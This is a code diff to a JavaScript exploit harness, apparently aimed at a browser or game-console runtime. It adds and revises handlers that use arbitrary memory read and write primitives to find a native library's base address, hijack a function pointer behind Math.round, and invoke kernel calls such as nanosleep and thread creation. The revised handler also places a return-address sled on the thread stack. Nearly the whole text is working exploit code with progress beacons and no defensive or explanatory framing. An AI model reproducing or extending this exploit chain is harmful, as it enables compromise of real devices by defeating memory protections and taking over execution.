@@ -5654,6 +5654,66 @@ function _startWsShell(){
         break;
       }
 
+      case 'nap':{
+        /* THE NANOSLEEP TEST: call export entry #msg.idx with the
+         * scope set to a timespec {tv_sec: msg.sec, tv_nsec: 0}.
+         * If the entry is nanosleep, the call BLOCKS for msg.sec
+         * seconds then returns 0 - the beacon timestamps show the
+         * gap. Harmless (4s), unambiguous, recoverable. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function NP(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('NAP-'+s),false);x.send();}catch(e){}}
+        try{
+          var idx=parseInt(msg.idx)||17;
+          var sec=parseInt(msg.sec)||4;
+          var tbl=null;
+          /* derive lk_base via the chain */
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='base unaligned';break;}
+          var can=S.absRead(B+0x751D0n,8)[0];
+          if(!(can>0x1000000n)){reply.err='canary fail';break;}
+          reply.base='0x'+B.toString(16);
+          tbl=B+0x48000n;
+          var e1=S.absRead(tbl+BigInt(0xC+idx*8),8)[0];
+          var sR=Number(e1&0xFFFFFFFFn);
+          var txt=0x48000+Number(BigInt.asIntN(32,BigInt(sR)));
+          var target=B+BigInt(txt);
+          reply.idx=idx;reply.text='0x'+txt.toString(16);
+          NP('1 target=0x'+target.toString(16)+' sec='+sec);
+          /* set the scope = timespec */
+          S.absWrite(S.fakeScope,BigInt(sec));
+          S.absWrite(S.fakeScope+8n,0n);
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origFnR=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,target);
+          NP('2 CALLING');
+          try{Math.round(-5.7);}catch(e){}
+          S.absWrite(S.neEntry.addr+0x28n,origFnR);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          NP('3 RETURNED');
+          var sc0=S.absRead(S.fakeScope,8)[0],sc1=S.absRead(S.fakeScope+8n,8)[0];
+          reply.scope=['0x'+sc0.toString(16),'0x'+sc1.toString(16)];
+          reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR);
+          NP('4 scope0=0x'+sc0.toString(16)+' scope1=0x'+sc1.toString(16));
+        }catch(e2){reply.err='nap fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'tw':{
         /* THE THREAD WITNESS (the game lane's 56l probe ported): the
          * thr_new candidate (export entry #msg.idx) called with a FULLY
@@ -5710,19 +5770,29 @@ function _startWsShell(){
           TW('5 idx='+idx+' text=0x'+txt.toString(16)+' target=0x'+target.toString(16));
           reply.idx=idx;
           reply.text='0x'+txt.toString(16);
-          /* BUILD THE PARAM at fakeScope (0x50 bytes):
-           * +0x00 start_func +0x08 arg +0x10 stack_base +0x18 stack_size
-           * +0x20 tls_base +0x28 tls_size +0x30 child_tid +0x38 parent_tid
-           * +0x40 flags +0x48 rtp  (the game lane 56l layout) */
-          var thrStub=B+0x2C0n;                    /* the PROVEN thr_self stub */
-          var argBuf=S.fakeScope+0x100n;           /* child writes its tid here */
+          /* BUILD THE PARAM at fakeScope (0x50 bytes) - v2 THE NANOSLEEP PARK:
+           * +0x00 start_func = THE NANOSLEEP STUB (msg.nap or the
+           * interpolated 0x8B0 default) - the child calls
+           * nanosleep(&{tv_sec=0x7FFFFFFF}) and BLOCKS IN THE KERNEL
+           * for 68 years. NO userland execution, NO crash, the
+           * parent posts the reply at leisure. Fallback: a small
+           * thr_self-stub sled on the same 16KB page as the scope
+           * (committed - no more viewBase+0x100000 fills, the tw-20
+           * fill died on an uncommitted cage page). */
+          var thrStub=B+0x2C0n;                    /* the PROVEN thr_self stub (the fallback sled entry) */
+          var napRva=parseInt(msg.nap)||0x8B0;      /* the nanosleep stub RVA (nap-tested) */
+          var napStub=B+BigInt(napRva);
+          var tsPtr=S.fakeScope+0x200n;             /* the crafted timespec */
           var tidOut=S.fakeScope+0x180n;           /* child_tid target */
           var parOut=S.fakeScope+0x188n;           /* parent_tid target */
-          var stackBase=S.viewBase+0x100000n;       /* 1MB into the 64MB view */
-          var stackSize=0x40000;                   /* 256KB park stack (proven committed - 1MB fill hit an uncommitted cage page) */
-          TW('6 building param stub=0x'+thrStub.toString(16));
-          S.absWrite(S.fakeScope+0x00n,thrStub);
-          S.absWrite(S.fakeScope+0x08n,argBuf);
+          var stackBase=S.fakeScope+0x400n;        /* the sled: same 16KB page as the scope = committed */
+          var stackSize=0x3000;                     /* 12KB = 1536 fallback entries */
+          TW('6 building param nap=0x'+napStub.toString(16));
+          /* the timespec: 68 years */
+          S.absWrite(tsPtr,0x7FFFFFFFn);
+          S.absWrite(tsPtr+8n,0n);
+          S.absWrite(S.fakeScope+0x00n,napStub);   /* start_func = nanosleep */
+          S.absWrite(S.fakeScope+0x08n,tsPtr);     /* arg = &timespec */
           S.absWrite(S.fakeScope+0x10n,stackBase);
           S.absWrite(S.fakeScope+0x18n,BigInt(stackSize));
           S.absWrite(S.fakeScope+0x20n,0n);         /* tls_base = 0 (56l-proven) */
@@ -5734,14 +5804,12 @@ function _startWsShell(){
           /* zero the witness buffers */
           S.absWrite(tidOut,0n);
           S.absWrite(parOut,0n);
-          S.absWrite(argBuf,0n);
-          /* FILL the park stack with the thr_self stub address (ret-sled) */
-          TW('7 filling stack 0x'+stackSize.toString(16));
+          /* THE FALLBACK SLED (small, committed page) */
           var fillN=Math.floor(stackSize/8);
           for(var fi=0;fi<fillN;fi++){
             S.absWrite(stackBase+BigInt(fi*8),thrStub);
           }
-          TW('8 stack filled n='+fillN);
+          TW('7 sled filled n='+fillN);
           /* THE CALL: RDI = fakeScope (the param), RSI = cfr (huge size).
            * DO NOT zero the scope - the param IS the scope. */
           if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
